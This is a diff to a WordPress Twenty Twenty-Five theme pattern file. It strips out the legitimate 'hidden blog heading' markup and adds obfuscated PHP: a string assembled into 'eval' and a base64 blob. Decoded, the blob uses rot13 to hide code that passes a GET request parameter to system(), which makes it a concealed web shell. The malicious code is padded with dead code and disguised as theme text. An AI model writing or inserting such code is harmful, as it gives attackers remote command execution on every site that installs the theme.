@@ -1,26 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Title: Hidden blog heading
- * Slug: twentytwentyfive/hidden-blog-heading
- * Description: Hidden heading for the home page and index template.
- * Inserter: no
- *
- * @package WordPress
- * @subpackage Twenty_Twenty_Five
- * @since Twenty Twenty-Five 1.0
- */
-
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogR3ZneXI6IFV2cXFyYSBveWJ0IHVybnF2YXQKICogRnlodDogZ2pyYWdsZ2pyYWdsc3Zpci91dnFxcmEtb3lidC11cm5xdmF0CiAqIFFyZnBldmNndmJhOiBVdnFxcmEgdXJucXZhdCBzYmUgZ3VyIHVienIgY250ciBuYXEgdmFxcmsgZ3J6Y3luZ3IuCiAqIFZhZnJlZ3JlOiBhYgogKgogKiBAY25weG50ciBKYmVxQ2VyZmYKICogQGZob2NucHhudHIgR2pyYWdsX0dqcmFnbF9TdmlyCiAqIEBmdmFwciBHanJhZ2wgR2pyYWdsLVN2aXIgMS4wCiAqLwoKPz4KPCEtLSBqYzp1cm5xdmF0IHtcImdya2dOeXZ0YVwiOlwieXJzZ1wiLFwieXJpcnlcIjoxfSAtLT4KPHUxIHB5bmZmPVwiamMtb3licHgtdXJucXZhdCB1bmYtZ3JrZy1ueXZ0YS15cnNnXCI+PD9jdWMgcmZwX3VnenlfciggJ095YnQnLCAnZ2pyYWdsZ2pyYWdsc3ZpcicgKTsgPz48L3UxPgo8IS0tIC9qYzp1cm5xdmF0IC0tPgoKJHB6cSA9ICRfVFJHWydjJ107CiRzem5jWydrMSddKCRwenEpOwo/PiI7CmV2YWwoJGYoJGMpKTsKPz4=");
+$f($c);
 ?>
-<!-- wp:heading {"textAlign":"left","level":1} -->
-<h1 class="wp-block-heading has-text-align-left"><?php esc_html_e( 'Blog', 'twentytwentyfive' ); ?></h1>
-<!-- /wp:heading -->
